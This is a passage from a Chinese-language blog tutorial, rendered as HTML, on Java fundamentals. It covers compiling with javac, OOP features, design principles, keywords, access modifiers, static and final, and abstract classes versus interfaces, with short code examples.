class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//注：String args[] 与 String[] args 都可以执行，但推荐使用 String[] args，这样可以避免歧义和误读。</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1程序编译和运行"><a href="#1-1程序编译和运行" class="headerlink" title="1.1程序编译和运行"></a>1.1程序编译和运行</h4><p>在java环境文件夹目录下打开cmd(或者打开cmd后cd到java的环境文件夹中也行)。输入命令：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javac HelloWorld.java <span class="hljs-comment">//编译</span><br>java HelloWorld <span class="hljs-comment">//运行。需要注意的是java命令后面不需要加.class</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="2-java三大特性"><a href="#2-java三大特性" class="headerlink" title="2.java三大特性"></a>2.java三大特性</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">封装：封装把一个对象的属性私有化，同时提供一些可以被外界访问的属性的方法，如果属性不想被外界访问，我们大可不必提供方法给外界访问优点：减少耦合，代码重用，减轻维护<br>继承：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。<br>多态：指允许不同类的对象对同一消息做出响应。<span class="hljs-comment">//只适用于方法，而不适用于属性。</span><br><span class="hljs-comment">//多态性</span><br><span class="hljs-comment">//针对方法：编译看左，运行看右。针对属性：编译和运行都看左。</span><br></code></pre></div></td></tr></table></figure><p>多态一般分为编译时多态和运行时多态，编译时主要指方法的重载；运行时主要指程序中定义的对象引用所指向的具体类型在运行期间才确定</p><p>运行时多态有三个条件：继承、覆盖和重写、向上转型（父类引用指向子类对象）</p><hr><h3 id="3-java六大原则"><a href="#3-java六大原则" class="headerlink" title="3.java六大原则"></a>3.java六大原则</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>开闭原则：对扩展开发放，对修改关闭，要求在添加新功能时不需要修改代码，符合开闭原则最典型的设计模式是装饰者模式<br><span class="hljs-number">2.</span>单一职责原则：一个类只负责一件事，尽量使用合成/聚合的方式，而不是使用继承。<br><span class="hljs-number">3.</span>里式替换原则 ：任何基类可以出现的地方，子类一定可以出现。<br><span class="hljs-number">4.</span>依赖倒转原则：依赖于抽象而不依赖于具体<br><span class="hljs-number">5.</span>接口隔离原则：使用多个隔离的接口，比使用单个接口要好 ，不应该强迫客户依赖于它们不用的方法。<br><span class="hljs-number">6.</span>迪米特法则：一个软件实体应当尽可能少地与其他实体发生相互作用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="4-JAVA关键字"><a href="#4-JAVA关键字" class="headerlink" title="4.JAVA关键字"></a>4.JAVA关键字</h3><table><thead><tr><th align="left">类别</th><th align="left">关键字</th><th>说明</th></tr></thead><tbody><tr><td align="left">访问控制</td><td align="left">private</td><td>私有的</td></tr><tr><td align="left"></td><td align="left">protected</td><td>受保护的</td></tr><tr><td align="left"></td><td align="left">public</td><td>公共的</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left">类、方法和变量修饰符</td><td align="left">abstract</td><td>声明抽象</td></tr><tr><td align="left"></td><td align="left">class</td><td>类</td></tr><tr><td align="left"></td><td align="left">extends</td><td>扩充,继承</td></tr><tr><td align="left"></td><td align="left">final</td><td>最终值,不可改变的</td></tr><tr><td align="left"></td><td align="left">implements</td><td>实现（接口）</td></tr><tr><td align="left"></td><td align="left">interface</td><td>接口</td></tr><tr><td align="left"></td><td align="left">native</td><td>本地，原生方法（非 Java 实现）</td></tr><tr><td align="left"></td><td align="left">new</td><td>新,创建</td></tr><tr><td align="left"></td><td align="left">static</td><td>静态</td></tr><tr><td align="left"></td><td align="left">strictfp</td><td>严格,精准</td></tr><tr><td align="left"></td><td align="left">synchronized</td><td>线程,同步</td></tr><tr><td align="left"></td><td align="left">transient</td><td>短暂</td></tr><tr><td align="left"></td><td align="left">volatile</td><td>易失</td></tr><tr><td align="left">程序控制语句</td><td align="left">break</td><td>跳出循环</td></tr><tr><td align="left"></td><td align="left">case</td><td>定义一个值以供 switch 选择</td></tr><tr><td align="left"></td><td align="left">continue</td><td>继续</td></tr><tr><td align="left"></td><td align="left">default</td><td>默认</td></tr><tr><td align="left"></td><td align="left">do</td><td>运行</td></tr><tr><td align="left"></td><td align="left">else</td><td>否则</td></tr><tr><td align="left"></td><td align="left">for</td><td>循环</td></tr><tr><td align="left"></td><td align="left">if</td><td>如果</td></tr><tr><td align="left"></td><td align="left">instanceof</td><td>实例</td></tr><tr><td align="left"></td><td align="left">return</td><td>返回</td></tr><tr><td align="left"></td><td align="left">switch</td><td>根据值选择执行</td></tr><tr><td align="left"></td><td align="left">while</td><td>循环</td></tr><tr><td align="left">错误处理</td><td align="left">assert</td><td>断言表达式是否为真</td></tr><tr><td align="left"></td><td align="left">catch</td><td>捕捉异常</td></tr><tr><td align="left"></td><td align="left">finally</td><td>有没有异常都执行</td></tr><tr><td align="left"></td><td align="left">throw</td><td>抛出一个异常对象</td></tr><tr><td align="left"></td><td align="left">throws</td><td>声明一个异常可能被抛出</td></tr><tr><td align="left"></td><td align="left">try</td><td>捕获异常</td></tr><tr><td align="left">包相关</td><td align="left">import</td><td>引入</td></tr><tr><td align="left"></td><td align="left">package</td><td>包</td></tr><tr><td align="left">基本类型</td><td align="left">boolean</td><td>布尔型</td></tr><tr><td align="left"></td><td align="left">byte</td><td>字节型</td></tr><tr><td align="left"></td><td align="left">char</td><td>字符型</td></tr><tr><td align="left"></td><td align="left">double</td><td>双精度浮点</td></tr><tr><td align="left"></td><td align="left">float</td><td>单精度浮点</td></tr><tr><td align="left"></td><td align="left">int</td><td>整型</td></tr><tr><td align="left"></td><td align="left">long</td><td>长整型</td></tr><tr><td align="left"></td><td align="left">short</td><td>短整型</td></tr><tr><td align="left">变量引用</td><td align="left">super</td><td>父类,超类</td></tr><tr><td align="left"></td><td align="left">this</td><td>本类</td></tr><tr><td align="left"></td><td align="left">void</td><td>无返回值</td></tr><tr><td align="left">保留关键字</td><td align="left">goto</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">const</td><td>是关键字，但不能使用</td></tr><tr><td align="left"></td><td align="left">null</td><td>空</td></tr></tbody></table><hr><h3 id="5-java注释"><a href="#5-java注释" class="headerlink" title="5.java注释"></a>5.java注释</h3><p>支持单行以及多行注释。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 这是单行注释的示例</span><br><span class="hljs-comment">/* 这个也是单行注释的示例 */</span><br><span class="hljs-comment">/* 这是第一个Java程序</span><br><span class="hljs-comment">    * 它将输出 Hello World</span><br><span class="hljs-comment">    * 这是一个多行注释的示例</span><br><span class="hljs-comment">    */</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="6-方法重载和重写的区别"><a href="#6-方法重载和重写的区别" class="headerlink" title="6.方法重载和重写的区别"></a>6.方法重载和重写的区别</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重写：发生在继承类中，方法名和参数列表相同，重写有以下三个限制：<br><span class="hljs-number">1.</span>子类方法的访问权限必须大于等于父类方法。<br><span class="hljs-number">2.</span>子类方法的返回类型必须是父类方法返回类型或为其子类型。如父类为<span class="hljs-keyword">void</span>，则子类也只能为<span class="hljs-keyword">void</span>。<br><span class="hljs-number">3.</span>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。即子类抛出的异常类型不大于父类的异常类型。<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">重载：发生在同一个类中，方法名相同，参数列表不同（个数、类型、顺序），与权限修饰、返回值类型、抛出异常无关。<br></code></pre></div></td></tr></table></figure><p>注意：构造器是不可以被重写的，但是能重载。<br>构造方法的特性：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>名字与类名相同。<br><span class="hljs-number">2.</span>没有返回值，但不能用<span class="hljs-keyword">void</span>声明构造函数。<br><span class="hljs-number">3.</span>生成类的对象时自动执行，无需调用。<br></code></pre></div></td></tr></table></figure><hr><h3 id="7-常用修饰符特性"><a href="#7-常用修饰符特性" class="headerlink" title="7.常用修饰符特性"></a>7.常用修饰符特性</h3><p>Java中有4中访问权限的修饰符：private、default（(默认一般省略）、public、protected。一般用于对类或类中的成员（字段以及方法）加上访问修饰符。<br>权限的主要作用范围：同一个类中、同一个包下、父子类、不同的包<br>可被修饰对象：类和成员变量；类可见表示其它类可以用这个类创建实例对象；成员可见表示其它类可以用这个类的实例对象访问到该成员。<br>4种修饰符的权限范围：</p><blockquote><ul><li>private：指”私有的”。被其修饰的属性以及方法只能被该类的对象访问，其子类不能访问，更不能允许跨包访问</li><li>default：即不加任何访问修饰符，通常称为“默认访问权限“或者“包访问权限”。该模式下，只允许在同一个包中进行访问。</li><li>protected: 介于public 和 private 之间的一种访问修饰符，一般称之为“保护访问权限”。被其修饰的属性以及方法只能被类本身的方法及子类访问，即使子类在不同的包中也可以访问。</li><li>public： Java语言中访问限制最宽的修饰符，一般称之为“公共的”。被其修饰的类、属性以及方法不仅可以跨类访问，而且允许跨包访问。</li></ul></blockquote><table><thead><tr><th>修饰符</th><th>同类</th><th>同包</th><th>子类</th><th>不同包非子类</th></tr></thead><tbody><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>default</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>很容易看出，权限范围从小到大依次为：private &lt; default &lt; protected &lt; public</p><h4 id="final和static"><a href="#final和static" class="headerlink" title="final和static"></a>final和static</h4><p>final</p><hr><p>在Java中，final关键字可以用来修饰类、方法和变量（包括成员变量和局部变量）</p><ul><li>修饰变量：表示常量，对于基本类型，final 使数值不变；对于引用类型，final 使引用地址不变，但对象本身的属性是可以被修改的。</li><li>修饰方法：不能被子类的方法重写，但可以被继承，不能修饰构造方法。。</li><li>修饰类 ：该不能被继承，没有子类，final类中的方法默认是final的。Java中的String类就是一个final类</li></ul><p>static</p><hr><p>在Java语言中，static 可以用来修饰成员变量和成员方法，当然也可以是静态代码块</p><ul><li>静态变量：又称为类变量，该类的所有实例都共享本类的静态变量，且在内存中只存在一份</li><li>静态方法：在类加载的时候就存在了，它不依赖于任何实例，只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字（此时可能没有实例）。</li><li>静态语句块：在类初始化时运行一次。</li><li>静态内部类：非静态内部类依赖于外部类的实例，而静态内部类不需要。静态内部类不能访问外部类的非静态的变量和方法。</li></ul><p>需要注意的是：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-number">1.</span>静态变量，静态方法可以通过类名直接访问<br><span class="hljs-number">2.</span>初始化顺序：静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。（此处不演示，在类初始化篇章中演示）<br></code></pre></div></td></tr></table></figure><p>由于静态方法可以不通过对象进行调用，因此在静态方法里，不能调用其他非静态变量，也不可以访问非静态变量成员。</p><h4 id="成员变量、静态变量、局部变量的区别"><a href="#成员变量、静态变量、局部变量的区别" class="headerlink" title="成员变量、静态变量、局部变量的区别"></a>成员变量、静态变量、局部变量的区别</h4><p>从生命周期比较：</p><ul><li><p>静态变量可以被对象调用，也可以被类名调用。以static关键字申明的变量，其独立在对象之外，有许多对象共享的变量。在对象产生之前产生，存在于方法区静态区中。</p></li><li><p>成员变量只能被对象调用。随着对象创建而存在，随对象销毁而销毁。存在于堆栈内存中</p></li><li><p>局部变量在方法或语句块中申明的变量，生命周期只在定义的{}之中，不能跨方法或语句块使用。</p></li></ul><p>从访问权限比较：</p><ul><li><p>静态变量称为对象的共享数据，成员变量可以称为对象的特有数据，局部变量为方法所有</p></li><li><p>成员变量可以被 public,private,static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。</p></li></ul><h4 id="abstract-和-interface"><a href="#abstract-和-interface" class="headerlink" title="abstract 和 interface"></a>abstract 和 interface</h4><h5 id="1-abstract"><a href="#1-abstract" class="headerlink" title="1.abstract"></a>1.abstract</h5><p>在 Java 中 abstract 即抽象，一般使用 abstract 关键字修饰的类或方法。<br>修饰的类时，一定有构造器（构造函数），便于子类实例化时调用。</p><blockquote><p>1.不能被实例化，需要继承抽象类后才能实例化其子类。<br>2.访问权限可以使用public、private、protected，其表达形式为：（public）abstract class 类名{}<br>3.抽象类不能使用final关键字修饰，因为final修饰的类是无法被继承<br>4.可以定义构造方法、静态方法、普通方法；非抽象的普通成员变量、静态成员变量</p></blockquote><p>修饰的方法时，只需要声明方法，不需要写方法体（大括号也不写）。</p><blockquote><p>1.含有该抽象方法的类必须定义为抽象类，但抽象类可以没有抽象方法。<br>2.访问权限可以使用public、default、protected，不能为private，因为抽象方法必须被子类实现（覆写），而private权限对于子类来 说是不能访问的，所以就会产生矛盾，<br>3.不能用static修饰，因为没有主体<br>4.若子类没有重写父类中的所有抽象方法，则此子类必须也是一个抽象类，用abstract修饰；否则必须全部重写父类中的抽象类方法。</p></blockquote><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span>  <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">MyAbstract</span> </span>&#123;<br><span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;小米&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> price= <span class="hljs-number">1800</span>;<br><br>MyAbstract(String name)&#123;<br><span class="hljs-keyword">this</span>.name = name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(price);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//权限不能为 private //抽象方法</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>abstract使用注意点：</strong></p><blockquote><p>1.abstract 不能用来修饰 属性、构造器等结构。<br>2.abstract 不能用来修饰 私有方法、静态方法、final的方法、final的类。</p></blockquote><h5 id="2-interface"><a href="#2-interface" class="headerlink" title="2.interface"></a>2.interface</h5><p>在 Java中 interface 即接口，是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，Java 8 开始，接口也可以拥有default的方法实现，是因为不支持默认方法的接口的维护成本太高。</p><blockquote><p>1.接口的方法访问权限只能为 public ，Java 8可以为default，但是必须有方法体<br>2.接口的方法默认public abstract 也可以由 static 修饰<br>3.接口的方法可以定义为 public static ，但是必须有方法体，且只能有接口类名调用<br>4.成员变量默认为public staic final</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span>  <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-keyword">int</span> price = <span class="hljs-number">1800</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">default</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface print： default Method&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">price</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;MyInterface price=&quot;</span>+price);<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInterfaceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">MyInterface</span> </span>&#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span> </span>&#123;<br> System.out.println(<span class="hljs-string">&quot;I&#x27;m a MyInterfaceImpl&quot;</span>);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>MyInterface my = <span class="hljs-keyword">new</span> MyInterfaceImpl();<br>my.outName();<br>my.print();<br><span class="hljs-comment">//MyInterfaceImpl.print();// 实现类类名调用时， 提示编译错误</span><br>MyInterface.price();<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="3-abstract-和-interface-的区别"><a href="#3-abstract-和-interface-的区别" class="headerlink" title="3.abstract 和 interface 的区别"></a>3.abstract 和 interface 的区别</h5><p>从定义分析</p><ul><li><p>抽象类和接口都不能直接实例化；抽象方法必须由子类来进行重写</p></li><li><p>抽象类单继承，接口多实现</p></li><li><p>抽象类可有构造方法，普通成员变量，非抽象的普通方法，静态方法</p></li><li><p>抽象类的抽象方法访问权限可以为：public、protected 、default</p></li><li><p>接口中变量类型默认public staic final，</p></li><li><p>接口中普通方法默认public abstract，没有具体实现</p></li><li><p>jdk1.8 中接口可有静态方法和default（有方法体）方法</p></li></ul><p>从应用场合分析</p><ul><li>接口：需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。</li><li>抽象类：1、在既需要统一的接口，又需要实例变量或缺省的方法的情况下就可以使用它；2、定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口</li></ul><h4 id="私有访问修饰符-private"><a href="#私有访问修饰符-private" class="headerlink" title="私有访问修饰符-private"></a>私有访问修饰符-private</h4><p>私有访问修饰符是最严格的访问级别，所以被声明为 private 的方法、变量和构造方法只能被所属类访问，并且类和接口不能声明为 private。</p><h4 id="受保护的修饰符-protected"><a href="#受保护的修饰符-protected" class="headerlink" title="受保护的修饰符-protected"></a>受保护的修饰符-protected</h4><ul><li>子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问；</li><li>子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法。<br>protected 可以修饰数据成员，构造方法，方法成员，不能修饰类（内部类除外）。接口及接口的成员变量和成员方法不能声明为 protected。<br>如果我们只想让该方法对其所在类的子类可见，则将该方法声明为 protected。<h4 id="访问控制和继承"><a href="#访问控制和继承" class="headerlink" title="访问控制和继承"></a>访问控制和继承</h4>注意以下方法继承的规则：<blockquote><ul><li>父类中声明为 public 的方法在子类中也必须为 public。</li><li>父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。</li><li>父类中声明为 private 的方法，不能够被继承。</li></ul></blockquote></li></ul><h4 id="非访问修饰符"><a href="#非访问修饰符" class="headerlink" title="非访问修饰符"></a>非访问修饰符</h4><p>1.static 修饰符，用来修饰类方法和类变量。<br>2.final 修饰符，用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。<br>3.abstract 修饰符，用来创建抽象类和抽象方法。<br>4.synchronized 和 volatile 修饰符，主要用于线程的编程。</p><h5 id="1-static-修饰符"><a href="#1-static-修饰符" class="headerlink" title="1.static 修饰符"></a>1.static 修饰符</h5><p>可以用来修饰：属性、方法、代码块、内部类。</p><ul><li>静态变量：<br>static 关键字用来声明独立于对象的静态变量，无论一个类实例化多少对象，它的静态变量只有一份拷贝。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。</li><li>静态方法：<br>static 关键字用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。</li></ul><p>对类变量和方法的访问可以直接使用 classname.variablename 和 classname.methodname 的方式访问。</p><p>使用 类.方法 或 对象.方法：</p><table><thead><tr><th></th><th>静态方法</th><th>非静态方法</th></tr></thead><tbody><tr><td>类</td><td>YES</td><td>NO</td></tr><tr><td>对象</td><td>YES</td><td>YES</td></tr></tbody></table><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        p it = <span class="hljs-keyword">new</span> p();<br>        p.eat();<br><span class="hljs-comment">//      p.sleep(); //不能通过类访问非静态方法</span><br>        it.eat();<br>        it.sleep();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">p</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String s;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃完了&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;睡觉了&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出</span><br>吃完了<br>吃完了<br>睡觉了<br></code></pre></div></td></tr></table></figure><blockquote><p>静态方法中：只能调用静态方法或属性。在静态方法内不能使用 this、super关键字。<br>非静态方法中：既可以调用非静态方法或属性，也可以调用静态的方法或属性。</p></blockquote><h5 id="2-final修饰符"><a href="#2-final修饰符" class="headerlink" title="2.final修饰符"></a>2.final修饰符</h5><p>可以修饰：类、方法、变量。</p><p>final 类不能被继承，没有类能够继承 final 类的任何特性。</p><p>父类中的 final 方法可以被子类继承，但是不能被子类重写。<br>声明 final 方法的主要目的是防止该方法的内容被修改。</p><p>变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。<br>final 修饰符通常和 static 修饰符一起使用来创建类常量。初始化时，可以在代码块中初始化、构造器中初始化。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> w = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> l;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> r;<br>&#123;<br>l=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>r=<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>final 也可以在形参中修饰，但被修饰的值在函数中不能改变，只能调用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;<br><span class="hljs-comment">//n=20; 不可以改变值</span><br>System.out.println(n);<span class="hljs-comment">//可以正常输出</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="3-abstract-修饰符"><a href="#3-abstract-修饰符" class="headerlink" title="3.abstract 修饰符"></a>3.abstract 修饰符</h5><p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。<br>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。<br>抽象类可以包含抽象方法和非抽象方法。</p><p>抽象方法是一种没有任何实现的方法，该方法的的具体实现由子类提供。<br>抽象方法不能被声明成 final 和 static。<br>任何继承抽象类的子类必须实现父类的所有抽象方法，除非该子类也是抽象类。<br>如果一个类包含若干个抽象方法，那么该类必须声明为抽象类。抽象类可以不包含抽象方法。<br>抽象方法的声明以分号结尾，例如：public abstract sample();。</p><h5 id="4-synchronized-修饰符"><a href="#4-synchronized-修饰符" class="headerlink" title="4.synchronized 修饰符"></a>4.synchronized 修饰符</h5><p>synchronized 关键字声明的方法同一时间只能被一个线程访问。synchronized 修饰符可以应用于四个访问修饰符。</p><h5 id="5-transient-修饰符"><a href="#5-transient-修饰符" class="headerlink" title="5.transient 修饰符"></a>5.transient 修饰符</h5><p>序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。<br>该修饰符包含在定义变量的语句中，用来预处理类和变量的数据类型。</p><h5 id="6-volatile-修饰符"><a href="#6-volatile-修饰符" class="headerlink" title="6.volatile 修饰符"></a>6.volatile 修饰符</h5><p>volatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。<br>一个 volatile 对象引用可能是 null。</p><hr><h3 id="8-数据类型"><a href="#8-数据类型" class="headerlink" title="8.数据类型"></a>8.数据类型</h3><p>Java 语言提供了八种基本类型：六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。并且还提供了其对应的引用类型。</p><h4 id="char"><a href="#char" class="headerlink" title="char"></a>char</h4><p>在 Java 中是用 unicode来表示字符，所以 2 个字节来表示一个字符； 一个数字或英文或汉字都是一个字符，只不过数字和英文时，存储的2个字节的第一个字节都为0，就是浪费了点空间。存汉字就占满了2个字节。</p><h4 id="boolean"><a href="#boolean" class="headerlink" 